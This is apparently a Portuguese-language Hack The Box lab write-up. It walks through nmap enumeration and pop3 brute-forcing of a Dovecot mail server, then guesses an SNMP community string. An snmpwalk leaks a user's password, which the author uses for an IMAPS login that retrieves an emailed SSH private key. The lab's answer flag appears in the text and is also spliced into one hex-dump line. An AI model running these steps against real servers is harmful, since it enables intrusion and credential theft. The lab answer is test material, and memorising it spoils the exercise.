## Alvo
- IP -> 10.129.202.20

## Objetivo
- Foi nos dados informações de um servidor MX de gerenciamento pra rede interna , na qual esse servidor também serve de backup para as contas internas do domínio.
- Enumere o servidor com cuidado e encontre o nome de usuário "HTB" e sua senha. Em seguida, envie a senha do HTB como resposta. -> cr3n4o7rzse7rzhnckhssncif7ds

## Ferramentas e scripts utilizados
- nmap
- openssl

## Resultados obtidos
```
sudo nmap -sS 10.129.202.20                         
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 09:19 -0400
Nmap scan report for 10.129.202.20
Host is up (0.50s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 6.20 seconds
```
Aqui vemos pelo nmap que tem 4 servidores rodando no servidor de destino , todos eles batendo com o "MX" (tirando o ssh) quesão sobre gerenciamento de emails , sendo 110 e 143 em texto puro e 993 e 995 criptografados.

--- 

```
sudo nmap -sV -sC 10.129.202.20 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 09:22 -0400
Nmap scan report for 10.129.202.20
Host is up (1.7s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: CAPA PIPELINING USER RESP-CODES UIDL SASL(PLAIN) STLS TOP AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: more IDLE OK SASL-IR LITERAL+ have capabilities STARTTLS listed Pre-login AUTH=PLAINA0001 post-login ENABLE IMAP4rev1 LOGIN-REFERRALS ID
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more IDLE OK ID LITERAL+ have capabilities listed Pre-login AUTH=PLAINA0001 post-login SASL-IR IMAP4rev1 ENABLE LOGIN-REFERRALS
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA UIDL SASL(PLAIN) PIPELINING USER AUTH-RESP-CODE RESP-CODES TOP
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.85 seconds
```
Aqui vemos informações quanto a nome de DNS , nome do servidor , os comandos permitidos a serem utilizados dentro de cada serviço, estão rodando em um linux (Ubuntu).

---

```
sudo nmap --script pop3* -p 110,995 10.129.202.20
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 09:27 -0400
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 46.00% done; ETC: 09:30 (0:01:23 remaining)
Stats: 0:02:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 51.72% done; ETC: 09:32 (0:02:26 remaining)
Nmap scan report for 10.129.202.20
Host is up (0.36s latency).

PORT    STATE SERVICE
110/tcp open  pop3
|_pop3-capabilities: CAPA RESP-CODES AUTH-RESP-CODE UIDL TOP PIPELINING SASL(PLAIN) USER STLS
| pop3-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 73 guesses in 282 seconds, average tps: 0.4
|_  ERROR: Failed to connect.
995/tcp open  pop3s
| pop3-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 238 guesses in 274 seconds, average tps: 0.9
|_  ERROR: Failed to connect.
|_pop3-capabilities: UIDL TOP CAPA PIPELINING RESP-CODES SASL(PLAIN) AUTH-RESP-CODE USER

Nmap done: 1 IP address (1 host up) scanned in 285.93 seconds

```
Não consegui resultados interessantes através dos scripts do nmap para os serviços pop3 , vou tentar os do imap.

Mas antes resolvi rodar para portas udp e ver que tipo de porta tenho aberta.

---
```
sudo nmap -sU -F 10.129.202.20
Nmap scan report for 10.129.202.20
Host is up (0.31s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 104.56 seconds
```
Vemos que tem um servidor snmp rodando , se houver vulnerabilidades nele podemos entrar e ver várias informações dos dispositivos de redes conectados nesse serviço.
```
sudo nmap -sU -sV -sC -p 161 10.129.202.20          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 09:36 -0400
Nmap scan report for 10.129.202.20
Host is up (0.90s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 10
|_  snmpEngineTime: 18m32s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.63 seconds
```
Vemos que é da v3 que tem autenticação por user e senha, além de uma criptografia. Vamos tentar utilizar o onesixtyone para fazer bruteforce nesse server.
```
┌──(kali㉿kali)-[~]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.129.202.20 -p 161
Scanning 1 hosts, 120 communities
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.129.202.20 -p 161 
Scanning 1 hosts, 120 communities
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.202.20 -p 161 
Scanning 1 hosts, 3218 communities
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```
Na terceira tentativa de lista achamos a string de comunidade backup nesse servidor UDP que podemos utilizar com snmwalk.
```
snmpwalk -v2c -c backup 10.129.202.20     
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (158036) 0:26:20.36
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (27) 0:00:00.27
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (26) 0:00:00.26
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (26) 0:00:00.26
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (26) 0:00:00.26
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (26) 0:00:00.26
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (26) 0:00:00.26
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (26) 0:00:00.26
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (26) 0:00:00.26
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (26) 0:00:00.26
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (27) 0:00:00.27
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (27) 0:00:00.27
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (160008) 0:26:40.08
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 08 1D 0D 2D 00 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 159
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)
```
Utilizei o snmp walk com a string de comunidade e vemos nesses logs que tem um script rodando que tenta fazer a alteração da senha do tom , nisso vemos o user tom e senha NMds732Js2761 . Vamos utilizar essas credenciais para logar no imap.

---
```
openssl s_client -connect 10.129.202.20:imaps
Connecting to 10.129.202.20
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=NIXHARD
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=NIXHARD
verify return:1
---
Certificate chain
 0 s:CN=NIXHARD
   i:CN=NIXHARD
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Nov 10 01:30:25 2021 GMT; NotAfter: Nov  8 01:30:25 2031 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
BQAwEjEQMA4GA1UEAwwHTklYSEFSRDAeFw0yMTExMTAwMTMwMjVaFw0zMTExMDgw
MTMwMjVaMBIxEDAOBgNVBAMMB05JWEhBUkQwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQDEBpDfkH4Ro5ZXW44NvnF3N9lKz27V1hgRppyUk5y/SEPKt2zj
EU+r2tEHUeHoJHQZBbW0ybxh+X2H3ZPNEG9nV1GtFQfTBVcrUEpN5VV15aIbdh+q
j53pp/wcL/d8+Zg2ZAaVYWvQHVqtsAudQmynrV1MHA39A44fG3/SutKlurY8AKR0
MW5zMPtflMc/N3+lH8UUMBf2Q+zNSyZLiBEihxK3kfMW92HqWeh016egSIFuxUsH
kk4xpGmyG9NDYna47dQzoHCg+42KgqFvWrGw2nIccaEIX5XA8rU9u53C7EQzDzmQ
vAtHpKWBwNmiivxAz/QC7MPExWIWtZtOqxmfAgMBAAGjITAfMAkGA1UdEwQCMAAw
EgYDVR0RBAswCYIHTklYSEFSRDANBgkqhkiG9w0BAQsFAAOCAQEAG+Dm9pLJgNGC
X1YmznmtBUekhXMrU67tQl745fFasJQzIrDgVtK27fjAtQRwvIbDruSwTj47E7+O
XdS7qyjFNBerklWNq4fEAVI7BmkxnTS9542okA/+UmeG70LdKjzFS+LjjOnyWzTh
YwU8uUjLfnRca74kY0DkVHOIkwZQha0J+BrKSADq/zDjkG0g4v0vzHINOmHx9eiE
67NoJKJPY5S3RYWxl/4x8Kphx7PNJBPC75gYjlxxDhxdYu9a3daqJUa58/qOm6P8
w1P9nA6lkg7NopyqepulLAzIcqnTjb/nMD2Pd9b6vgWc3IqSfFreqjzshZ+FjNZo
zR+tR6z4TQ==
-----END CERTIFICATE-----
subject=CN=NIXHARD
issuer=CN=NIXHARD
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 1283 bytes and written 1738 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 3802AE2F296585AACA5A5F7330E1F7F2D61753056858FEED68ADDDD1687965BF
    Session-ID-ctx: 
    Resumption PSK: 51D46E5319142221BABC921BF04BFD8D9933AB56E78C007F2DA0DC9A4DFF040C45DF3B24C55256D39E04DA5EB30EA853
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 9b 58 56 a0 4f 73 f3 7b-d3 4a d7 4c 77 fb 79 f8   .XV.Os.{.J.Lw.y.
    0010 - 48 53 f5 d9 9b a9 0c 44-b3 49 cc 9e 31 b2 9d 96   HS.....D.I..1...
    0020 - 98 43 4b f3 be fc 96 ea-68 73 ca 26 87 67 6c 6b   .CK.....hs.&.glk
    0030 - ec 88cr3n4o7rzse7rzhnckhssncif7ds 28 a2 34 6b c5 e2-a9 f8 59 da e3 8c 48 f5   ..(.4k....Y...H.
    0040 - fa 72 c7 2e 1d 8b 3a dc-2e 41 7e 5b d6 ff 83 ca   .r....:..A~[....
    0050 - e7 14 70 bb c7 06 92 5d-ac 90 22 85 8e c1 2d 54   ..p....].."...-T
    0060 - d5 f1 6a 9f bf de 64 5f-91 01 63 26 ca a5 8f 12   ..j...d_..c&....
    0070 - d1 e0 04 73 8f 91 11 dd-d0 08 ec 43 10 46 c0 4b   ...s.......C.F.K
    0080 - 86 1a 20 39 81 05 cb 6f-79 37 96 13 6f 73 2d 8e   .. 9...oy7..os-.
    0090 - b3 43 03 8f 8e 2b db 0f-cc 72 6f 7c e4 f4 00 46   .C...+...ro|...F
    00a0 - ab da 90 f0 a4 e6 0b dc-a1 72 85 d4 93 6f 0f 70   .........r...o.p
    00b0 - cb 64 9e 23 b1 14 3c 9a-41 50 7d 28 9f f2 6d 4b   .d.#..<.AP}(..mK

    Start Time: 1788012010
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 6C228221462F6939512227883BD454FE4C442AB679A0B8B0C704F4EDB644A7A0
    Session-ID-ctx: 
    Resumption PSK: F771D18FB3EBC875A000E3F009CF55D100FAA2B6B0E9016352156486B0C8F9E446AE49E963CCFCDBDBE1DD612C2E11C5
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 9b 58 56 a0 4f 73 f3 7b-d3 4a d7 4c 77 fb 79 f8   .XV.Os.{.J.Lw.y.
    0010 - ea 7c b8 36 07 39 cc 17-5b 37 37 cf 0a 3e ff 97   .|.6.9..[77..>..
    0020 - 1e 26 9a 3b 27 3d 26 44-a7 fd dc 4c e6 1e df f2   .&.;'=&D...L....
    0030 - 79 1a ec ed d0 c9 fe 84-bc 4e 0b bc ba a0 3a 2a   y........N....:*
    0040 - 0e 15 d3 33 6d 28 62 4c-c5 d7 ad b9 39 cd 90 c0   ...3m(bL....9...
    0050 - b1 54 00 01 20 42 4d c1-2b b7 cb 5f 49 c6 c4 3a   .T.. BM.+.._I..:
    0060 - bf 58 a0 df 49 5c 13 5a-c8 78 e8 bc 0f 72 4c 26   .X..I\.Z.x...rL&
    0070 - a9 03 31 be e1 47 67 ba-d7 a4 ee b4 5e d0 bf 07   ..1..Gg.....^...
    0080 - 9c 40 bc 81 5f eb 4a 21-05 bc 77 76 92 93 57 18   .@.._.J!..wv..W.
    0090 - e4 b8 8a 8a 2b 66 77 9c-34 f4 cb 89 fe 32 fc d5   ....+fw.4....2..
    00a0 - 2d f6 f0 ef 84 3f 0c d3-a5 71 cc d5 a9 d0 70 7f   -....?...q....p.
    00b0 - 86 0f 54 76 1d 1b 4b a6-a9 bd 35 87 c9 68 fc b0   ..Tv..K...5..h..

    Start Time: 1788012010
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
1 LOGIN tom NMds732Js2761
1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
1 LIST "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren) "." Important
* LIST (\HasNoChildren) "." INBOX
1 OK List completed (0.001 + 0.000 secs).
1 SELECT "Important"
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509062] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
1 OK [READ-WRITE] Select completed (0.001 + 0.000 secs).
1 SELECT "INBOX"
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
1 OK [READ-WRITE] Select completed (0.001 + 0.000 + 0.001 secs).
1 SEARCH all
* SEARCH 1
1 OK Search completed (0.001 + 0.000 secs).
1 FETCH 1 all
* 1 FETCH (FLAGS (\Seen) INTERNALDATE "10-Nov-2021 01:44:26 +0000" RFC822.SIZE 3661 ENVELOPE ("Wed, 10 Nov 2010 14:21:26 +0200" "KEY" ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "tom" "inlanefreight.htb")) NIL NIL NIL NIL))
1 OK Fetch completed (0.002 + 0.000 + 0.001 secs).
1 FETCH 1 (body[])
* 1 FETCH (BODY[] {3661}
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
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
